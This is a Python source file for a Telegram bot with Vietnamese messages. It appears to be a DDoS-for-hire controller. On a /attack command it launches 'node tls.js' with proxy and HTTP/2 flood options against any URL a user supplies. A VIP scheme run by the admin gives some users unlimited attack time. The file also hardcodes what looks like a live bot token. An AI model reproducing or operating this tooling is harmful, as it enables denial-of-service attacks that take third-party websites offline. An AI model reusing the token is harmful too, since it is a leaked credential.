# bot.py
import asyncio
import json
import logging
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Config
BOT_TOKEN = '8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A'
ADMIN_ID = 7105201572
VIP_FILE = 'vip.json'

class BotManager:
    def __init__(self):
        self.vip_users = self.load_vip()
        self.active_attacks = {}
    
    def load_vip(self):
        try:
            with open(VIP_FILE, 'r') as f:
                return set(json.load(f))
        except FileNotFoundError:
            return set([ADMIN_ID])  # Mặc định admin là VIP
    
    def save_vip(self):
        with open(VIP_FILE, 'w') as f:
            json.dump(list(self.vip_users), f)
    
    def is_admin(self, user_id):
        return user_id == ADMIN_ID
    
    def is_vip(self, user_id):
        return user_id in self.vip_users
    
    def add_vip(self, user_id):
        self.vip_users.add(user_id)
        self.save_vip()
    
    def remove_vip(self, user_id):
        if user_id in self.vip_users and user_id != ADMIN_ID:
            self.vip_users.remove(user_id)
            self.save_vip()
            return True
        return False

    def format_target(self, target):
        """Định dạng target URL"""
        target = target.strip()
        if not target.startswith(('http://', 'https://')):
            if '.' in target:
                return f'https://{target}'
        return target

# Khởi tạo bot manager
bot_mgr = BotManager()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    commands = """
🤖 **BOT ATTACK CONTROL** 🚀

🔧 **Lệnh cơ bản:**
/attack <url> <time> - Khởi động attack
/checkvip - Kiểm tra VIP status
/vipinfo - Thông tin VIP
/stop - Dừng attack hiện tại

👑 **Lệnh Admin:**
/addvip <user_id> - Thêm VIP
/removevip <user_id> - Xóa VIP
/listvip - Danh sách VIP
/stats - Thống kê

💡 **Ví dụ:**
/attack example.com 60
/attack https://example.com 120
    """
    await update.message.reply_text(commands)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.first_name
    
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("❌ **Sai cú pháp!**\n✅ **Đúng:** /attack <url> <thời_gian>")
        return
    
    target = context.args[0]
    time_str = context.args[1]
    
    # Định dạng URL target
    formatted_target = bot_mgr.format_target(target)
    
    # Validate time
    try:
        time_int = int(time_str)
        if time_int <= 0:
            await update.message.reply_text("❌ Thời gian phải lớn hơn 0!")
            return
        
        if not bot_mgr.is_vip(user_id) and time_int > 120:
            await update.message.reply_text(
                f"❌ **Giới hạn thời gian!**\n"
                f"👤 Non-VIP: Tối đa 120s\n"
                f"💎 VIP: Không giới hạn\n"
                f"⏰ Bạn nhập: {time_int}s"
            )
            return
    except ValueError:
        await update.message.reply_text("❌ Thời gian phải là số!")
        return
    
    # Check if user has active attack
    if user_id in bot_mgr.active_attacks:
        await update.message.reply_text("⚠️ Bạn đang có attack chạy! Vui lòng chờ...")
        return
    
    # Start attack
    status_msg = await update.message.reply_text(
        f"🚀 **ĐANG KHỞI ĐỘNG ATTACK**\n"
        f"🎯 **Target:** `{formatted_target}`\n"
        f"⏰ **Time:** `{time_str}s`\n"
        f"👤 **User:** {username}\n"
        f"💎 **VIP:** {'✅' if bot_mgr.is_vip(user_id) else '❌'}\n"
        f"⏳ **Status:** Đang xử lý..."
    )
    
    try:
        # Prepare command
        cmd = [
            'node', 'tls.js',
            formatted_target, time_str, '4', '5', 'y.txt',
            '--http', '2',
            '--winter',
            '--full'
        ]
        
        # Mark attack as active
        bot_mgr.active_attacks[user_id] = {
            'process': None,
            'message': status_msg,
            'target': formatted_target,
            'time': time_str
        }
        
        # Execute attack
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        bot_mgr.active_attacks[user_id]['process'] = process
        
        await status_msg.edit_text(
            f"⚡ **ATTACK ĐANG CHẠY**\n"
            f"🎯 **Target:** `{formatted_target}`\n"
            f"⏰ **Time:** `{time_str}s`\n"
            f"👤 **User:** {username}\n"
            f"💎 **VIP:** {'✅' if bot_mgr.is_vip(user_id) else '❌'}\n"
            f"🟢 **Status:** Đang tấn công..."
        )
        
        # Wait for completion
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
        
        # Clean up
        if user_id in bot_mgr.active_attacks:
            del bot_mgr.active_attacks[user_id]
        
        if process.returncode == 0:
            result = stdout.decode('utf-8', errors='ignore') if stdout else "✅ Attack completed!"
            result_preview = result[:500] + "..." if len(result) > 500 else result
            
            await status_msg.edit_text(
                f"✅ **ATTACK HOÀN TẤT**\n"
                f"🎯 **Target:** `{formatted_target}`\n"
                f"⏰ **Time:** `{time_str}s`\n"
                f"👤 **User:** {username}\n"
                f"📊 **Kết quả:**\n```{result_preview}```"
            )
        else:
            error = stderr.decode('utf-8', errors='ignore') if stderr else "❌ Unknown error"
            error_preview = error[:500] + "..." if len(error) > 500 else error
            
            await status_msg.edit_text(
                f"❌ **ATTACK THẤT BẠI**\n"
                f"🎯 **Target:** `{formatted_target}`\n"
                f"⏰ **Time:** `{time_str}s`\n"
                f"👤 **User:** {username}\n"
                f"📋 **Lỗi:**\n```{error_preview}```"
            )
            
    except asyncio.TimeoutError:
        if user_id in bot_mgr.active_attacks:
            del bot_mgr.active_attacks[user_id]
        await status_msg.edit_text("❌ **ATTACK TIMEOUT!** Quá thời gian chờ.")
    except Exception as e:
        if user_id in bot_mgr.active_attacks:
            del bot_mgr.active_attacks[user_id]
        await status_msg.edit_text(f"❌ **LỖI HỆ THỐNG:** {str(e)}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in bot_mgr.active_attacks:
        process = bot_mgr.active_attacks[user_id]['process']
        if process:
            try:
                process.terminate()
                await asyncio.sleep(1)
                if process.returncode is None:
                    process.kill()
            except Exception:
                pass
        
        del bot_mgr.active_attacks[user_id]
        await update.message.reply_text("✅ Đã dừng attack của bạn!")
    else:
        await update.message.reply_text("❌ Bạn không có attack nào đang chạy!")

async def addvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not bot_mgr.is_admin(user_id):
        await update.message.reply_text("❌ Chỉ Admin mới có quyền này!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Thiếu user_id! Sử dụng: /addvip <user_id>")
        return
    
    try:
        vip_id = int(context.args[0])
        bot_mgr.add_vip(vip_id)
        await update.message.reply_text(f"✅ Đã thêm `{vip_id}` vào VIP!")
    except ValueError:
        await update.message.reply_text("❌ user_id phải là số!")

async def removevip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not bot_mgr.is_admin(user_id):
        await update.message.reply_text("❌ Chỉ Admin mới có quyền này!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Thiếu user_id! Sử dụng: /removevip <user_id>")
        return
    
    try:
        vip_id = int(context.args[0])
        if bot_mgr.remove_vip(vip_id):
            await update.message.reply_text(f"✅ Đã xóa `{vip_id}` khỏi VIP!")
        else:
            await update.message.reply_text(f"❌ `{vip_id}` không có trong VIP hoặc là Admin!")
    except ValueError:
        await update.message.reply_text("❌ user_id phải là số!")

async def checkvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if bot_mgr.is_vip(user_id):
        await update.message.reply_text(
            f"👑 **BẠN LÀ VIP!**\n\n"
            f"✅ Thời gian attack: **KHÔNG GIỚI HẠN**\n"
            f"⚡ Ưu tiên cao nhất\n"
            f"🎯 Không giới hạn tính năng"
        )
    else:
        await update.message.reply_text(
            f"ℹ️ **THÔNG TIN TÀI KHOẢN**\n\n"
            f"⏰ Thời gian tối đa: **120 giây**\n"
            f"📊 Chế độ bình thường\n"
            f"💎 Liên hệ Admin để nâng cấp VIP"
        )

async def vipinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    vip_count = len(bot_mgr.vip_users)
    active_attacks = len(bot_mgr.active_attacks)
    
    await update.message.reply_text(
        f"💎 **THÔNG TIN HỆ THỐNG VIP** 💎\n\n"
        f"👑 **VIP Users:** {vip_count}\n"
        f"• Thời gian: KHÔNG GIỚI HẠN\n"
        f"• Ưu tiên: CAO NHẤT\n\n"
        f"👤 **Normal Users:**\n"
        f"• Thời gian: Tối đa 120s\n"
        f"• Ưu tiên: Bình thường\n\n"
        f"⚡ **Đang chạy:** {active_attacks} attacks\n\n"
        f"📋 **Lệnh:**\n"
        f"/checkvip - Kiểm tra VIP\n"
        f"/vipinfo - Thông tin này"
    )

async def listvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not bot_mgr.is_admin(user_id):
        await update.message.reply_text("❌ Chỉ Admin mới có quyền này!")
        return
    
    if not bot_mgr.vip_users:
        await update.message.reply_text("📝 Danh sách VIP trống!")
        return
    
    vip_list = '\n'.join([f'• `{user_id}`' for user_id in sorted(bot_mgr.vip_users)])
    await update.message.reply_text(
        f"👑 **DANH SÁCH VIP**\n\n"
        f"{vip_list}\n\n"
        f"**Tổng:** {len(bot_mgr.vip_users)} users"
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not bot_mgr.is_admin(user_id):
        await update.message.reply_text("❌ Chỉ Admin mới có quyền này!")
        return
    
    vip_count = len(bot_mgr.vip_users)
    active_attacks = len(bot_mgr.active_attacks)
    
    active_users = []
    for uid, attack_data in bot_mgr.active_attacks.items():
        active_users.append(f"• User {uid}: {attack_data['target']} ({attack_data['time']}s)")
    
    active_list = '\n'.join(active_users) if active_users else "• Không có attack nào"
    
    await update.message.reply_text(
        f"📊 **THỐNG KÊ HỆ THỐNG**\n\n"
        f"👑 **VIP Users:** {vip_count}\n"
        f"⚡ **Active Attacks:** {active_attacks}\n\n"
        f"🔧 **Đang chạy:**\n{active_list}"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý tin nhắn thường"""
    if update.message and update.message.text:
        text = update.message.text
        if text.startswith('/'):
            await update.message.reply_text("❌ Lệnh không hợp lệ! Gõ /start để xem danh sách lệnh.")

def main():
    """Khởi chạy bot"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Thêm handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("attack", attack))
        application.add_handler(CommandHandler("stop", stop))
        application.add_handler(CommandHandler("addvip", addvip))
        application.add_handler(CommandHandler("removevip", removevip))
        application.add_handler(CommandHandler("checkvip", checkvip))
        application.add_handler(CommandHandler("vipinfo", vipinfo))
        application.add_handler(CommandHandler("listvip", listvip))
        application.add_handler(CommandHandler("stats", stats))
        
        # Handler cho tin nhắn thường
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("🤖 Bot Telegram đang khởi động...")
        print(f"👑 Admin ID: {ADMIN_ID}")
        print(f"💎 Số VIP users: {len(bot_mgr.vip_users)}")
        print("🔧 Bot đã sẵn sàng!")
        
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Lỗi khởi động bot: {e}")

if __name__ == '__main__':
    main()
